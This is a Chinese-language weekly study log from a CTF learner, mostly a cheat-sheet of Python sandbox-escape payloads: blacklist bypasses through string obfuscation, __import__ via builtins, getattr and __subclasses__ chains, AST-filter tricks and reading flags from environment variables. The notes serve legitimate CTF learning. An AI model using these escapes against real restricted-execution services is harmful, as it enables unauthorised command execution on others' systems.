# <font style="color:rgb(38, 38, 38);">完成事项</font>
1. 学习了python的沙盒逃逸
2. 比赛
3. 学习数据库:<a href="https://uk5555544.github.io/2026/01/29/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%85%A5%E9%97%A8(%E4%B8%80)/">见博客</a>
# <font style="color:rgb(38, 38, 38);">下周待做事项</font>
1. 比赛，有时间把wp整理一下
2. 继续学习数据库
3. 有时间想把java的反序列化学一下
# <font style="color:rgb(38, 38, 38);">本周学习的知识分享</font>
## python沙盒逃逸
在沙盒中绕过并写入危险的内置函数，达成读取数据，任意命令执行的效果。CTF经常以python在线编译器的方式出现

#### 常用的内置函数及模块
print sys.version # 查看python版本
+ ##### os模块
> os模块提供了与操作系统进行交互的功能，可以执行系统命令、处理文件和目录等
```python
import os
os.system("") # 执行系统命令，返回命令执行状态码
os.popen('whoami').read() #执行系统命令并返回结果(字符串)
os.listdir('.') # 列出当前目录下的文件和文件夹
```
+ ##### subprocess模块
Python2.4引入的模块
> 前提:shell=True默认开启，此时subprocess只接受字符串参数
它会通过系统的shell来解析和执行命令
```python
import subprocess
subprocess.call('ls -l', shell=True) # 执行系统命令,只适用旧版
result = subprocess.run('ls -l', capture_output=True, text=True) # 适用于3.5及以上
# capture_output=True：自动捕获stdout和stderr
# text=True：将输出作为字符串处理（否则是字节流bytes）
print(result.stdout) 
```
+ ##### platform模块
常规用法
```python
import platform 
print(platform.popen('dir').read())
```
platform模块内置了os模块和sys模块，其中sys模块可以调用其他模块
```python
import platform
platform.os.system('whoami')
platform.sys.modules['os'].system('whoami')
```
+ ##### commands模块(只限python2)
```python
import commands
print(commands.getoutput('cat /flag')/commands.getstatusoutput('cat /flag'))
```
+ ##### timeit模块
timetit模块本来用于测量小段代码的执行时间，但也可以用于执行系统命令
```python
import timeit
timeit.timeit("__import__('os').system('whoami')", number=1)
# timeit.timeit(stmt, setup, number)
# setup里的代码执行一次，stmt里的内容都会执行number次
```
timetit模块也导入了sys模块
```python
timeit.sys.modules['os'].system('ls')
```
+ ##### 一些执行函数
\_\_import__函数用于动态导入模块，避免直接使用import语句
```python
__import__('os').system('whoami')
```
如果\_\_import__被禁用，可以使用内置对象__builtins__来导入
```python
__builtins__.__import__('os').system('ls')
```
或者可以使用warnings模块来导入(python3+)
```python
warnings.__dict__['__builtins__']['__import__']('os').system('ls')
# __dict__为warnings的属性字典
```
还可以使用importlib模块
```python
import importlib
importlib.import_module('os').system('ls')
```
python3.6新增f执行字符串
```python
f'{__import__("os").system("ls")}'
```

open函数用于打开文件
```python
open('flag.txt').read()
```
+ ##### 高级绕过
1. 当已知某个模块的路径时，我们可以使用execfile函数来导入(只限python2)
```python
execfile('/usr/lib/python2.7/os.py')
```
也可以用open函数，py3也适用
```python
with open('/usr/lib/python3.6/os.py','r') as f:
    exec(f.read())
# 很暴力，用read()读取整个文件内容
```
2. 针对字符串，当后端禁用某些字符时，可以使用字符拼接/大小写/编码/切片等方法绕过
```python
b = 'o'
a = 's'
__import__(a+b).system('ls')

__import__('OS'.lower()).system('ls')

__import__('\x6f\x73').system('ls')

__import__('so'[::-1]).system('ls')
```
3. sys.modules是python内置的模块缓存字典，每当导入一个模块时，都会在sys.modules中创建一个条目。下一次导入则会直接从sys.modules中获取模块，而不是重新初始化。有些沙盒为了不让你用内置模块会进行缓存过滤，所以有时候可以清理缓存再导入使其重新加载
```python
sys.modules['os'] = None # 投毒，os被ban
del sys.modules['os'] # 删除缓存
import os # 重新导入
os.system('ls')
```
4. getattr逃逸

getattr(object, name)用于获取对象的属性(attr)，可以动态访问对象的属性和方法

attr可以在ast.Attribute节点中禁掉，此时我们可以利用getattr函数调用的方式来访问属性。在函数中属性名是字符串
```python
getattr(os, 'metsys'[::-1])('whoami')
getattr(os, '\x73\x79\x73\x74\x65\x6d')('ls')

s = chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)
getattr(os, s)('ls')
# 引号过滤
```
有些时候，我们必须要想ssti那样从低层获取模块，这时就不得不用getattr了
```python
getattr(getattr(getattr((), '__class__'), '__base__'), '__subclasses__')()
# ex的无点过滤
```
5. (f,)[0]

要想知道这一点，我必须详细解释一下ast.Attribute节点。AST是python解释器底层的模块，模块会把代码拆散成一个个节点，然后逐个执行。
>isinstance(对象, 类型): 判断对象是否是某种类型，是则返回True。比如isinstance(node, ast.Attribute)控制
type(): 返回对象的类型
ast.Attribute：负责属性访问，包含对象(value)和属性名(attr)
ast.Call：负责函数调用，包含函数(func)和参数(args)
ast.Name：负责变量名
ast.Constant：负责常量值
ast.Subscript：负责下标访问

有些沙盒会用isinstance(对象, 类型)/type()往节点设置严格黑名单，导致你无法使用某些功能，比如会严卡ast.Attribute，ast.Call，ast.Name

如果黑名单严格，这时我们需要利用其他节点，比如ast.Subscript

我们可以先定义一个函数，再把它装入一个元组里，用下标方式访问函数(python很包容)，再用__globals__逃逸
```python
def f(): pass
g = (f,)[0].__globals__
```
这里只是提供一种思想

6. 环境变量

一些ctf搭建平台会把flag放在环境变量中，可以通过os.environ获取(比如 GZCTF)
```python
print(os.environ.get('GZCTF_FLAG'))
```
看来web手还是要玩转python
# <font style="color:rgb(38, 38, 38);">本周学习总结</font>
参加了uni和furry，学习了python沙盒逃逸的基础知识，使用了mysql数据库
# <font style="color:rgb(38, 38, 38);">杂项</font>
练习科目二